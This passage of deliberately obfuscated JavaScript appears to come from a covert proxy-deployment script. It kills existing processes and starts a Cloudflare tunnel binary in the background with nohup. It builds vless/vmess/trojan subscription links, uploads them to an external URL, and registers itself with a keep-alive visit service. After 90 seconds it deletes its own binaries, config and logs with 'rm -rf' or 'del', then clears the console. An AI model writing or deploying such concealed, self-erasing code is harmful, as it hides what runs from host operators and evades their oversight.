axios['get'](_0x45747c(0x2c6)+'api.co/jso'+'n/',{'timeout':0xbb8});if(_0x19ba01['data']&&_0x19ba01['data'][_0x45747c(0x229)+'de']&&_0x19ba01['data'][_0x45747c(0x25e)])return(_0x19ba01['data']['country_co'+'de']+'_'+_0x19ba01[_0x45747c(0x288)]['org'])['replace'](/ /g,'_');}catch(_0x1c52fa){try{const _0x45668f=await axios[_0x45747c(0x280)](_0x45747c(0x256)+'api.com/js'+'on/',{'timeout':0xbb8});if(_0x45668f[_0x45747c(0x288)]&&_0x45668f['data'][_0x45747c(0x246)]===_0x45747c(0x292)&&_0x45668f[_0x45747c(0x288)]['countryCod'+'e']&&_0x45668f['data']['org'])return(_0x45668f['data'][_0x45747c(0x298)+'e']+'_'+_0x45668f[_0x45747c(0x288)][_0x45747c(0x25e)])['replace'](/ /g,'_');}catch(_0x3ac71d){}}return'Unknown';}async function extractDomains(){const _0x601af5=_0xb1e4aa;let _0x539af1;if(ARGO_AUTH&&ARGO_DOMAIN)_0x539af1=ARGO_DOMAIN,console[_0x601af5(0x242)]('ARGO_DOMAI'+'N:',_0x539af1),await _0x8f2fb6(_0x539af1);else try{const _0x30f567=fs['readFileSy'+'nc'](bootLogPath,_0x601af5(0x2d1)),_0x2e5300=_0x30f567['split']('\x0a'),_0xc89524=[];_0x2e5300['forEach'](_0x45b797=>{const _0x167066=_0x601af5,_0x4f0c68=_0x45b797[_0x167066(0x25a)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x4f0c68){const _0x344d45=_0x4f0c68[0x1];_0xc89524[_0x167066(0x204)](_0x344d45);}});if(_0xc89524['length']>0x0)_0x539af1=_0xc89524[0x0],console['log']('ArgoDomain'+':',_0x539af1),await _0x8f2fb6(_0x539af1);else{console['log']('未找到ArgoDom'+_0x601af5(0x2de)+_0x601af5(0x236)+'ain'),fs[_0x601af5(0x251)](bootLogPath);async function _0x2b7900(){const _0x4db9c4=_0x601af5;try{process['platform']==='win32'?await exec('taskkill\x20/'+_0x4db9c4(0x2a2)+botName+('.exe\x20>\x20nul'+'\x202>&1')):await exec(_0x4db9c4(0x28b)+'['+botName['charAt'](0x0)+']'+botName['substring'](0x1)+(_0x4db9c4(0x223)+_0x4db9c4(0x207)));}catch(_0x2d5f4f){}}_0x2b7900(),await new Promise(_0x41cc3a=>setTimeout(_0x41cc3a,0xbb8));const _0xda2655='tunnel\x20--e'+_0x601af5(0x1ee)+_0x601af5(0x24d)+'--no-autou'+_0x601af5(0x211)+_0x601af5(0x206)+_0x601af5(0x26f)+'le\x20'+bootLogPath+('\x20--logleve'+'l\x20info\x20--u'+'rl\x20http://'+'localhost:')+EXTERNAL_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0xda2655+(_0x601af5(0x25b)+'l\x202>&1\x20&')),console[_0x601af5(0x242)](botName+'\x20运行中'),await new Promise(_0xcb3b53=>setTimeout(_0xcb3b53,0xbb8)),await extractDomains();}catch(_0x5bc151){console[_0x601af5(0x2df)]('执行命令错误:\x20'+_0x5bc151);}}}catch(_0xf902ff){console[_0x601af5(0x2df)]('读取boot.log'+_0x601af5(0x28c),_0xf902ff);}async function _0x8f2fb6(_0x4dfb67){const _0x3b20a6=_0x601af5,_0x5bf287=await getMetaInfo(),_0x285a2c=NAME?NAME+'-'+_0x5bf287:_0x5bf287,_0x4c1714={'v':'2','ps':_0x285a2c,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x3b20a6(0x219),'net':'ws','type':'none','host':_0x4dfb67,'path':_0x3b20a6(0x2dc)+'o?ed=2560','tls':'tls','sni':_0x4dfb67,'fp':'firefox'},_0x5b60d4=Buffer['from'](JSON['stringify'](_0x4c1714))['toString'](_0x3b20a6(0x29c)),_0x52b773='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+(_0x3b20a6(0x2bc)+'n=none&sec'+_0x3b20a6(0x2dd)+_0x3b20a6(0x260))+_0x4dfb67+('&fp=firefo'+_0x3b20a6(0x1fe)+_0x3b20a6(0x24f))+_0x4dfb67+('&path=%2Fv'+_0x3b20a6(0x221)+'3Fed%3D256'+'0#')+_0x285a2c+_0x3b20a6(0x230)+_0x5b60d4+(_0x3b20a6(0x20a)+'/')+UUID+'@'+CFIP+':'+CFPORT+(_0x3b20a6(0x22f)+'tls&sni=')+_0x4dfb67+('&fp=firefo'+'x&type=ws&'+'host=')+_0x4dfb67+(_0x3b20a6(0x2c1)+'rojan-argo'+'%3Fed%3D25'+_0x3b20a6(0x218))+_0x285a2c+_0x3b20a6(0x1ed);return console[_0x3b20a6(0x242)]('订阅内容Base64'+':'),console['log'](Buffer['from'](_0x52b773)['toString']('base64')),subscriptionContent=_0x52b773,fs['writeFileS'+'ync'](subPath,Buffer[_0x3b20a6(0x1f6)](_0x52b773)['toString']('base64')),console['log'](subPath+_0x3b20a6(0x22b)),uploadNodes(),_0x52b773;}}async function uploadNodes(){const _0x14cb9c=_0xb1e4aa;if(UPLOAD_URL&&PROJECT_URL){const _0x2d1acf=PROJECT_URL+'/'+SUB_PATH,_0x35c5a6={'subscription':[_0x2d1acf]};try{const _0x176134=await axios[_0x14cb9c(0x255)](UPLOAD_URL+('/api/add-s'+'ubscriptio'+'ns'),_0x35c5a6,{'headers':{'Content-Type':_0x14cb9c(0x239)+_0x14cb9c(0x268)}});return _0x176134&&_0x176134['status']===0xc8?(console[_0x14cb9c(0x242)]('订阅上传成功'),_0x176134):null;}catch(_0x11e42b){if(_0x11e42b[_0x14cb9c(0x270)]){if(_0x11e42b['response']['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x14cb9c(0x2af)](listPath))return;const _0x4e568f=fs['readFileSy'+'nc'](listPath,_0x14cb9c(0x2d1)),_0x13f1b7=_0x4e568f['split']('\x0a')[_0x14cb9c(0x209)](_0x541e84=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x14cb9c(0x26c)](_0x541e84));if(_0x13f1b7['length']===0x0)return;const _0x826c73=JSON['stringify']({'nodes':_0x13f1b7});try{const _0x3738d6=await axios['post'](UPLOAD_URL+(_0x14cb9c(0x24c)+'odes'),_0x826c73,{'headers':{'Content-Type':'applicatio'+'n/json'}});return _0x3738d6&&_0x3738d6[_0x14cb9c(0x246)]===0xc8?(console[_0x14cb9c(0x242)](_0x14cb9c(0x275)),_0x3738d6):null;}catch(_0x58025b){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x5632bd=_0x402d,_0xd65cbd=[bootLogPath,configPath,webPath,botPath,monitorPath];if(NEZHA_PORT)_0xd65cbd[_0x5632bd(0x204)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0xd65cbd[_0x5632bd(0x204)](phpPath);process['platform']===_0x5632bd(0x1ec)?exec('del\x20/f\x20/q\x20'+_0xd65cbd[_0x5632bd(0x209)](_0x4d1ec4=>fs[_0x5632bd(0x2af)](_0x4d1ec4))[_0x5632bd(0x1e8)]('\x20')+(_0x5632bd(0x2b2)+'1'),_0x2a9e0b=>{const _0x49043f=_0x5632bd;console['clear'](),console['log']('应用正在运行'),console[_0x49043f(0x242)]('感谢使用此脚本，享受'+'吧！');}):exec('rm\x20-rf\x20'+_0xd65cbd['filter'](_0x48a6d2=>fs['existsSync'](_0x48a6d2))['join']('\x20')+('\x20>/dev/nul'+_0x5632bd(0x2b7)),_0x58cad4=>{const _0x12652c=_0x5632bd;console['clear'](),console['log']('应用正在运行'),console[_0x12652c(0x242)]('感谢使用此脚本，享受'+'吧！');});},0x15f90);}async function AddVisitTask(){const _0x2d4067=_0xb1e4aa;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x2d4067(0x242)]('跳过添加自动访问任务');return;}try{const _0x10037c=await axios[_0x2d4067(0x255)]('https://oo'+'oo.serv00.'+_0x2d4067(0x258)+'l',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2d4067(0x239)+_0x2d4067(0x268)}});return console['log']('自动访问任务添加成功'),_0x10037c;}catch(_0x5b27a5){return console['error']('添加自动访问任务失败'+':\x20'+_0x5b27a5['message']),null;}}async function startserver(){const _0x59a54b=_0xb1e4aa;try{console['log']('开始服务器初始化..'+'.'),deleteNodes(),cleanupOldFiles(),argoType(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await downloadAndRunMonitorScript(),await AddVisitTask(),cleanFiles(),console['log']('服务器初始化完成');}catch(_0x5b8e1c){console[_0x59a54b(0x2df)](_0x59a54b(0x2c0)+'r错误:',_0x5b8e1c);}}app['listen'](PORT,()=>console['log']('HTTP服务运行在内'+_0xb1e4aa(0x21f)+PORT)),startserver()['catch'](_0x4a0e88=>{console['error']('未处理的starts'+'erver错误:',_0x4a0e88);}),process['on'](_0xb1e4aa(0x208),()=>{const _0x2269d6=_0xb1e4aa;console['log']('收到关闭信号，正在清'+_0x2269d6(0x26a)),console['log']('程序退出'),process['exit'](0x0);}),process['on']('SIGTERM',()=>{const _0x2fc7f7=_0xb1e4aa;console[_0x2fc7f7(0x242)]('收到终止信号，正在清'+'理...'),console['log'](_0x2fc7f7(0x238)),process[_0x2fc7f7(0x23d)](0x0);});
